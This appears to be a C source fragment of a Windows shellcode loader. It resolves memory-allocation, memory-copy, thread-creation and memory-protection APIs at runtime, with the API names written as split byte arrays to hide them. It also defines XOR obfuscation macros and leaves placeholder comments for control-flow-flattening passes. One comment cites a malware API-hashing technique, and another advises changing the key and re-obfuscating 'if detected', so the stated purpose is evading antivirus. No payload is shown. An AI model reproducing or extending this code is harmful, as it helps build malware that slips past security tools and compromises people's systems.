#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <windows.h>
#define OBFUSCATED_XOR1(a, b) ((a | b) & ~(a & b))
#define OBFUSCATED_XOR2(a, b) (~(~a & ~b) & ~(a & b))
#define OBFUSCATED_XOR3(a, b) (((a & ~b) | (~a & b)) & ~(a & b))
#define OBFUSCATED_XOR4(a, b) (((a | b) & ~(a & b)) | ((a & ~b) | (~a & b)))
#define OBFUSCATED_XOR5(a, b) ((a + b - ((a & b) * 2)))
#define OBFUSCATED_XOR6(a, b) (((a | b) - (a & b)))
#define OBFUSCATED_XOR7(a, b) (((a | b) * (~(a & b) & 1)))
// https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware
// If detected, just change the HASHKEY and reobfuscate
unsigned char sNtdll[] = { 'n', 0x74, 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char sGetProcAddress[]    = { 'G','e',0x74,'P','r','o','c','A','d','d','r','e','s','s', 0x0 };
unsigned char sVirtualAlloc[] = { 'V','i','r',0x74,'u','a','l','A','l','l','o','c', 0x0 };  // This is correct

unsigned char sRtlMoveMemory[]     = { 'R',0x74,'l','M','o','v','e','M','e','m','o','r','y', 0x0 };
unsigned char sCreateThread[]      = { 'C','r','e','a',0x74,'e',0x54,'h','r','e','a','d', 0x0 };
unsigned char sWaitForSingleObject[] = { 'W','a','i',0x74,'F','o','r','S','i','n','g','l','e','O','b','j','e','c',0x74, 0x0 };
unsigned char sVirtualProtect[] = {'V','i','r',0x74,'u','a','l','P','r','o',0x74,'e','c',0x74,0x0};
static LPVOID (WINAPI * pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
static VOID (WINAPI * pRtlMoveMemory)(VOID UNALIGNED*, const VOID UNALIGNED*, SIZE_T);
static FARPROC (WINAPI * pGetProcAddress)(HMODULE, LPCSTR);
static HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
static DWORD (WINAPI * pWaitForSingleObject)(HANDLE, DWORD);
static BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
static HMODULE hKernel32 = NULL;

static void InitFunctionPointers() {
	if (!hKernel32) {hKernel32 = LoadLibraryA((LPCSTR)sKernel32);};
//CFF
//CFF
//CFF
//CFF
//ROP64
//ROP64
//ROP64

//CFF
	pGetProcAddress = (FARPROC(WINAPI*)(HMODULE, LPCSTR))GetProcAddress(hKernel32, (LPCSTR) sGetProcAddress);
//CFF
//CFF
//CFF
//CFF
//ROP64
//ROP64
//ROP64

//CFF
    if (!pGetProcAddress) return;  // GetProcAddress must be valid
//CFF
//CFF
//CFF
//CFF
//ROP64
//ROP64
//ROP64

//CFF
    // Assign global function pointers using pGetProcAddress
    pCreateThread = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))
        pGetProcAddress(hKernel32, (LPCSTR) sCreateThread);
//CFF
//CFF
//CFF
//CFF
//ROP64
//ROP64
//ROP64

//CFF
    pVirtualAlloc = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))
        pGetProcAddress(hKernel32, (LPCSTR)sVirtualAlloc);
//CFF
//CFF
//CFF
//CFF
//ROP64
//ROP64
//ROP64

//CFF
    pRtlMoveMemory = (VOID(WINAPI*)(VOID UNALIGNED*, const VOID UNALIGNED*, SIZE_T))
        pGetProcAddress(hKernel32, (LPCSTR) sRtlMoveMemory);
//CFF
//CFF
//CFF
//CFF
//ROP64
//ROP64
//ROP64

//CFF
    pWaitForSingleObject = (DWORD(WINAPI*)(HANDLE, DWORD))
        pGetProcAddress(hKernel32, (LPCSTR) sWaitForSingleObject);
//CFF
//CFF
//CFF
//CFF
//ROP64
//ROP64
//ROP64

//CFF
//CFF
//CFF
//CFF
//CFF
//ROP64
//ROP64
//ROP64

//CFF
	pGetProcAddress(hKernel32, (LPCSTR) sVirtualProtect);
pVirtualProtect = (BOOL (WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))
    pGetProcAddress(hKernel32, (LPCSTR) sVirtualProtect);

}
